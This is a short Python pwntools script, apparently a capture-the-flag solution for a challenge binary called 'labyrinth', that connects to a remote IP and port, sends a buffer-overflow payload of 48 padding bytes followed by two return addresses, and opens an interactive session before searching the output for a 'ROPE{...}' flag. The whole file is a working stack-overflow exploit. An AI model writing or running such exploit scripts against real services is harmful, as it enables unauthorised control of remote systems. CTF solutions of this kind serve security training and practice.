#!/usr/bin/env python3

from pwn import *

#elf = ELF('labyrinth')

p = remote('167.172.50.208', 30667)

payload = b"A"*48
payload += p64(0x401016)
payload += p64(0x401256)


p.sendline("69")
p.sendline(payload)
p.interactive()

response = p.recvall()
print(re.search("(ROPE{.*?})",response.decode()))